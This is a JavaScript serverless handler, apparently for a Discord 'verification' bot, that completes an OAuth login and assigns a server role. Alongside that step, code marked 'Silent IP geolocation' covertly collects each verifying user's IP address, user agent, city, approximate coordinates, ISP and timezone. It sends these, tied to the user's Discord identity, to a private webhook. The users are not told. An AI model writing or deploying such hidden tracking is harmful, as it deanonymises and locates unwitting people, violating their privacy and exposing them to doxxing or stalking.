export default async function handler(req, res) {
  const code = req.query.code;
  if (!code) return res.status(400).send("Missing code");

  const client_id = process.env.DISCORD_CLIENT_ID;
  const client_secret = process.env.DISCORD_CLIENT_SECRET;
  const bot_token = process.env.DISCORD_BOT_TOKEN;
  const guild_id = process.env.DISCORD_GUILD_ID;
  const role_id = process.env.DISCORD_ROLE_ID;
  const webhook_url = process.env.DISCORD_WEBHOOK_URL;

  const redirect_uri = "https://berify-topaz.vercel.app/api/callback";

  // Extract IP address from headers or socket
  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress || "Unknown IP";
  const userAgent = req.headers['user-agent'] || "Unknown User Agent";

  const params = new URLSearchParams({
    client_id,
    client_secret,
    grant_type: "authorization_code",
    code,
    redirect_uri,
  });

  try {
    // Exchange code for access token
    const tokenRes = await fetch("https://discord.com/api/oauth2/token", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: params.toString(),
    });

    const tokenText = await tokenRes.text();
    let tokenData;
    try {
      tokenData = JSON.parse(tokenText);
    } catch (e) {
      tokenData = {};
    }

    if (!tokenData.access_token) {
      console.error("Failed to get access token. Discord response:", tokenText);
      return res.status(400).send("Failed to get access token: " + tokenText);
    }

    // Fetch user info (identify scope only)
    const userRes = await fetch("https://discord.com/api/users/@me", {
      headers: { Authorization: `Bearer ${tokenData.access_token}` },
    });
    const userData = await userRes.json();

    // Add role to guild member
    const addRoleRes = await fetch(
      `https://discord.com/api/guilds/${guild_id}/members/${userData.id}/roles/${role_id}`,
      {
        method: "PUT",
        headers: {
          Authorization: `Bot ${bot_token}`,
        },
      }
    );

    if (!addRoleRes.ok) {
      const errorText = await addRoleRes.text();
      console.error("Failed to add role:", errorText);
      return res.status(500).send("Failed to assign role: " + errorText);
    }

    // Silent IP geolocation - use free service ip-api.com/json/{ip}
    let geoInfo = {};
    try {
      const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,lat,lon,isp,org,timezone,query`);
      geoInfo = await geoRes.json();
      if (geoInfo.status !== "success") {
        geoInfo = {};
      }
    } catch (e) {
      console.error("IP Geolocation fetch failed:", e);
      geoInfo = {};
    }

    // Build webhook embed fields
    const avatarUrl = userData.avatar
      ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png?size=1024`
      : null;

    // Collect fields for webhook embed
    const fields = [
      { name: "Username", value: `${userData.username}#${userData.discriminator}`, inline: true },
      { name: "User ID", value: userData.id, inline: true },
      { name: "IP Address", value: ip, inline: false },
      { name: "User Agent", value: userAgent, inline: false },
      { name: "Token Type", value: tokenData.token_type || "unknown", inline: true },
      { name: "Scope", value: tokenData.scope || "unknown", inline: true },
      { name: "Expires In (seconds)", value: tokenData.expires_in?.toString() || "unknown", inline: true },
    ];

    if (geoInfo.country) fields.push({ name: "Country", value: geoInfo.country, inline: true });
    if (geoInfo.regionName) fields.push({ name: "Region", value: geoInfo.regionName, inline: true });
    if (geoInfo.city) fields.push({ name: "City", value: geoInfo.city, inline: true });
    if (geoInfo.lat && geoInfo.lon) {
      fields.push({ name: "Approx. Location", value: `${geoInfo.lat}, ${geoInfo.lon}`, inline: false });
    }
    if (geoInfo.isp) fields.push({ name: "ISP", value: geoInfo.isp, inline: true });
    if (geoInfo.org) fields.push({ name: "Org", value: geoInfo.org, inline: true });
    if (geoInfo.timezone) fields.push({ name: "Timezone", value: geoInfo.timezone, inline: true });

    if (webhook_url) {
      await fetch(webhook_url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          embeds: [{
            title: "New User Verified",
            color: 0x7289DA,
            thumbnail: avatarUrl ? { url: avatarUrl } : undefined,
            fields,
            timestamp: new Date().toISOString(),
          }]
        }),
      });
    }

    return res.redirect(`https://discord.com/channels/${guild_id}`);
  } catch (error) {
    console.error(error);
    return res.status(500).send("Server error");
  }
}
